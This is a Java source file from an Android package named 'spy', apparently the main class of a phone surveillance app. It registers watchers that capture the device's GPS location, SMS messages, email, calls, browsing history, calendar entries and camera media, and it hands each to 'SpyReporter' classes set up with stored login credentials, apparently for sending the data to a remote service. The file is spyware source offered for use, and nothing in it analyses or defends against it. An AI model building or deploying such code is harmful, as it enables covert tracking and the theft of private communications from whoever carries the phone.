package org.ddth.android.spy;

import org.ddth.android.monitor.AndroidMonitorApplication;
import org.ddth.android.monitor.observer.AndroidBrowsingHistoryWatcher;
import org.ddth.android.monitor.observer.AndroidCalendarWatcher;
import org.ddth.android.monitor.observer.AndroidCallWatcher;
import org.ddth.android.monitor.observer.AndroidCameraWatcher;
import org.ddth.android.monitor.observer.AndroidEmailWatcher;
import org.ddth.android.monitor.observer.AndroidGpsWatcher;
import org.ddth.android.monitor.observer.AndroidSmsWatcher;
import org.ddth.android.spy.reporter.BrowsingHistorySpyReporter;
import org.ddth.android.spy.reporter.CalendarSpyReporter;
import org.ddth.android.spy.reporter.CallSpyReporter;
import org.ddth.android.spy.reporter.GpsSpyReporter;
import org.ddth.android.spy.reporter.MailSpyReporter;
import org.ddth.android.spy.reporter.MediaSpyReporter;
import org.ddth.android.spy.reporter.SmsSpyReporter;
import org.ddth.android.spy.reporter.SpyReporter;
import org.ddth.mobile.monitor.core.Watchdog;

import android.content.Context;
import android.content.IntentFilter;
import android.content.SharedPreferences;

/**
 * @author khoanguyen
 */
public class SpyApp extends AndroidMonitorApplication {
	public static final String APPLICATION_TAG = "spiderman";
	public static final String PASSWORD_FIELD = "password";
	public static final String USERNAME_FIELD = "username";

	@Override
	protected void initialize(Watchdog watchdog, IntentFilter filter) {
		// Yeah, I also want to read my configuration from local preferences
		SharedPreferences settings = getSharedPreferences(
				APPLICATION_TAG, Context.MODE_PRIVATE);
		String username = settings.getString(USERNAME_FIELD, "");
		String password = settings.getString(PASSWORD_FIELD, "");
		SpyReporter.getSpyLogger().setAuthCredentials(username, password);
		// Monitor all interesting events
		register(new AndroidGpsWatcher(new GpsSpyReporter(), 480000), filter);
		register(new AndroidSmsWatcher(new SmsSpyReporter()), filter);
		register(new AndroidEmailWatcher(new MailSpyReporter()), filter);
		register(new AndroidCallWatcher(new CallSpyReporter()), filter);
		register(new AndroidBrowsingHistoryWatcher(new BrowsingHistorySpyReporter()), filter);
		register(new AndroidCalendarWatcher(new CalendarSpyReporter()), filter);
		register(new AndroidCameraWatcher(new MediaSpyReporter(username)), filter);
		// Configuration dialog
		register(new ConfiguratingWatcher(), filter);
	}
}